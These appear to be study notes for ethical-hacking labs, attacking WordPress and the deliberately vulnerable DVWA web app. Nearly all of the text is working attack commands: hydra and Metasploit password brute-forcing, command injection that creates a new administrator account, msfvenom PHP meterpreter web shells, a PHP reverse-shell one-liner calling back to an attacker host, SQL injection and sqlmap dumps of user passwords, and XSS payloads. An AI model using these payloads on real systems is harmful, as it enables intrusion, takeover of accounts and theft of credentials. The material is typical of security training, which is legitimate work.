# Web Application hacking

<details><summary>Hack a Web Application using WPScan and Metasploit</summary>

```console

    [WS22]
    Launch wampserver

	[parrot]
	sudo su
	cd
	wpscan --api-token [API Token] --url http://[WSIP]:8080/CEH --enumerate u
	--enumerate u: specifies the enumeration of usernames.

	Obtained the usernames stored in the database.

    To find user's passwords.

	service postgresql start -> first start the PostgreSQL service.
	msfconsole
	use auxiliary/scanner/http/wordpress_login_enum 
	show options
	set PASS_FILE /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications/Wordlist/password.txt 
	set RHOSTS [WIP]
	set RPORT 8080
	set TARGETURI http://[WSIP]:8080/CEH 
	set USERNAME admin -> take any username obtained from above
	run
```
</details>

<details>
<summary>Perform remote os command injection (dvwa web) and get the content from pin file</summary>

```console
    [Win 11]
	http://[WSIP]:8080/dvwa/login.php
	test/abc123
	Command Injection
	
	Ping a device - [W22IP] -> successfully pings the target machine
	Try with ;/&&/&/ 
	| hostname          -> error -> Change security level to low
	| hostname 			-> return machine name, any other details from the system   
	| whoami
	| tasklist 			-> to view the processes running on the machine.
	| Taskkill /3112 /F -> Forcefully terminate the process

	/F- Forecefully terminate
	
	| dir C:\ 			-> files and directories on C:\
	| net user  		-> User account information
	| net user Test /Add ->	Attempt to add a user account remotely.
	| net user 			-> View the new user account
	| net user Test 	-> new account information
	
	Does not have administrative privileges. It has an entry called Local Group Memberships.
	
	| net localgroup Administrators Test/Add  -> To grant administrative privileges
	| net user Test     -> Test is now an administrator account under the Local Group Memberships option.
		
	Check able to connecto to Target machine with new user with RDC
	RDC -> [Target IP]
	Username: Test - connect
```
</details>

<details>
<summary>Perform file upload (dvwa web)</summary>

```console
    
	[linux]
	sudo su
	cd
	msfvenom -p php/meterpreter/reverse_tcp LHOST=[PIP] LPORT=444 -f raw
	Copy payload and paste it into upload.php
		
	Open http://WSIP:8080/dvwa/login.php
	admin/password
	security - low
	File upload - upload the upload.php
	
	[linux]
	sudo su
	cd
	msfconsole
	use exploit/multi/handler
	set payload php/meterpreter/reverse_tcp
	set LHOST [PIP]
	set LPORT 444
	run
	
	Firefox
	Open http://[WSIP]:8080/dvwa/hackable/uploads/upload.php
	
	Terminal - Meterpreter session has successfully been established with the victim system
	sysinfo
	
	----
	if securty set to high
	File upload - upload the high.jpeg
	
	Command Injection
	Ip address: |copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php + Submit
	
	Terminal
	sudo su
	cd
	msfconsole
	use exploit/multi/handler
	set payload php/meterpreter/reverse_tcp
	set LHOST [PIP]
	set LPORT 2222
	run 
	
	Firefox: http://[WSIP]:8080/dvwa/hackable/uploads/shell.php
	Terminal: Meterpreter session has successfully been established with the victim system.
	sysinfo
```

</details>

<details>
<summary>DVWA</summary>

```conose
hydra -l admin -p pasword 10.0.0.49 http-post-form="/login.php:username=admin&password=^PASS^&Login=Submit:Login failed"

hydra 10.0.0.49 http-form-post "/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed" -l admin -p password

NOT WORKING
hydra 10.0.0.49 http-form-post "/login.php:username=^USER^&password=^PASS^&Login=Login:H=cookie\:PHPSESSID=hokuv28srabuqss7p766lttp75; security=low:F=Login failed" -l admin -P /home/sbkali/Downloads/pass.txt

1. Vul - Brute-force 
security=low
hydra 10.0.0.49 http-form-get "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=cookie\:PHPSESSID=hokuv28srabuqss7p766lttp75; security=low:F=Username and/or password incorrect." -l admin -P /home/sbkali/Downloads/pass.txt

security=medium
hydra 10.0.0.49 http-form-get "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=cookie\:PHPSESSID=hokuv28srabuqss7p766lttp75; security=medium:F=Username and/or password incorrect." -l admin -P /home/sbkali/Downloads/pass.txt -V -I --> verbose

security=high
NOT WORKING
------------------------------------------------------------------------------------------------------------------------
Command Injection

check which char is accepting ;/&/|/||/&&

low
localhost
localhost | whoami
localhost | php -r '$sock=fsockopen("10.0.0.16",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

nc -nvlp 4444

medium

localhost | php -r '$sock=fsockopen("10.0.0.16",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

high
change secrity by intercepting then it will work
------------------------------------------------------------------------------------------------------------------------
File upload
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.16 LPORT=444 -f raw > shell.php

msfconsole
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.0.0.16
set LPORT 444
exploit

1. update Content-Type: image/jpeg 

Upload shell.php -> File is uploaded
Now access that file by entering the full path 10.0.0.49/hackable/uploads/../../hackable/uploads/shell.php

Reverse shell is open in msfconsole
sysinfo
whoami
pwd

High
add GIG 98 to shell.php
mv shell.php shell.php.jpeg
Similary intercept the req and update the security it will work for all. if only jpeg accepted then intercept and update Content-Type: image/jpeg -
------------------------------------------------------------------------------------------------------------------------
' or 1=1#   - Displays result

Find no of columns --> 2
' order by 1# - No error
' order by 1# - No error
' order by 3# -- error

' union select @@version, null#  --> 10.1.26-MariaDB-0+deb9u1
' or 0=0 union select null, user() #
' or 0=0 union select null,concat(user, password) from users #

First name: admin
Surname: admin

SQLMAP

1. sqlmap -u "http://10.0.0.49/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs --cookie="PHPSESSID=hokuv28srabuqss7p766lttp75; security=low" --batch
available databases [2]:
[*] dvwa
[*] information_schema

2. sqlmap -u "http://10.0.0.49/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa --cookie="PHPSESSID=hokuv28srabuqss7p766lttp75; security=low" --batch --dump-all

Blind Injection
' or sleep(5)#
1 or sleep(5)#

1 1=0 and union select null, concat(user,password) from users #
-------------------------------------------------------------------------------------------------------------
XSS-DOM
alert(1)
Medium: </select><video><source onerror="javascript:alert(1)"></video>
High: #<script>alert(1)</script>  --> commented javascript

Reflected

Low: <script>alert(1)</script>
Medium : <img src=x onerror=alert(1)>
High: <img src=x onerror=alert(1)>

Stored
low: <script>alert(1)</script>
medium: <img src=x onerror=alert(1)>
high: <img src=x onerror=alert(1)>
-------------------------------
echo -n "token" | wc -c --> 32
echo 'ChangeMe' | tr 'A-Za-z' 'N-ZA-Mn-za-m''
PunatrZr
echo -n "PunatrZr"| md5sum  -> same token 

echo 'success' | tr 'A-Za-z' 'N-ZA-Mn-za-m''
dsfsdf
echo -n "dsfsdf"| md5sum  -> diff token

put success and add diff token in burpsuit

```
</details>